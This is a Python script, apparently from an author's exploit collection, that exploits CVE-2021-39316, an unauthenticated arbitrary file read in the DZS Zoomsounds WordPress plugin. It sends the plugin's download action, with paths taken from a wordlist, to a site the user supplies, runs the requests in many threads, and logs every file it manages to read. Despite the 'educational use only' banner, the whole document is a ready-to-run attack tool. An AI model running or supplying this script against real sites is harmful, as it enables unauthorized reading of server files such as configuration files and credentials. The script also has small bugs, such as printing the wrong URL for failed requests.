import os
import subprocess
import concurrent.futures
import urllib.parse
import requests

# Function to execute a curl command and check the output
def execute_curl(url):
    response = requests.get(url, allow_redirects=False)
    if response.status_code != 200:
        return None
    
    command = ["curl", "-s", url]
    output = subprocess.check_output(command, universal_newlines=True, stderr=subprocess.STDOUT)
    if "failed to open stream: No such file or directory" in output or "Permission denied" in output:
        return None
    else:
        return url

# Prompt user for website URL with error checking
while True:
    website = input("Enter the website: ")
    if website.startswith("http://") or website.startswith("https://"):
        break
    else:
        website = "http://" + website  # Add "http://" prefix if missing

parsed_url = urllib.parse.urlparse(website)
base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/MYzoomsounds/?action=dzsap_download&link="

# Read directories from afr.txt
with open("afr.txt", "r") as file:
    directories = file.read().splitlines()

# Create a banner
print("""\033[93m
                   .'\   /`.
                 .'.-.`-'.-.`.
            ..._:   .-. .-.   :_...
          .'    '-.(o ) (o ).-'    `.
         :  _    _ _`~(_)~`_ _    _  :
        :  /:   ' .-=_   _=-. `   ;\  :
        :   :|-.._  '     `  _..-|:   :
         :   `:| |`:-:-.-:-:'| |:'   :
          `.   `.| | | | | | |.'   .'
            `.   `-:_| | |_:-'   .'
              `-._   ````    _.-'
                  ``-------''

    \033[92mCVE-2021-39316 DZS Zoomsounds 6.45 - Arbitrary File Read
         (Unauthenticated) Recon Script
              Made by ElPadr1no"\033[0m

\033[92mColorblindkeybangers.com | for educational use only
         "...there is no spoon..."\033[0m

""")

# Process directories using multithreading
results = []
failed_count = 0
total_count = len(directories)
with concurrent.futures.ThreadPoolExecutor() as executor:
    futures = []
    for index, directory in enumerate(directories, 1):
        directory = directory.strip()  # Remove leading/trailing whitespace
        url = base_url + directory
        print(f"\033[93m[INFO]\033[0m Testing: {url} ({index}/{total_count})")
        futures.append(executor.submit(execute_curl, url))

    for future, directory in zip(futures, directories):
        if future.result():
            print("\033[92m[SUCCESS]\033[0m", future.result())  # Print successful URLs in green
            results.append(f"{future.result()} => SUCCESS")
        else:
            print("\033[91m[FAILED]\033[0m", url)  # Print failed URLs in red
            failed_count += 1

# Save successful results to afr-results.txt
with open("afr-results.txt", "w") as file:
    file.write("\n".join(results))

# Display statistics
success_count = len(results)
print(f"\n\033[92m[INFO]\033[0m Recon completed.")
print(f"Total URLs: {total_count}")
print(f"Successful URLs: {success_count}")
print(f"Failed URLs: {failed_count}")
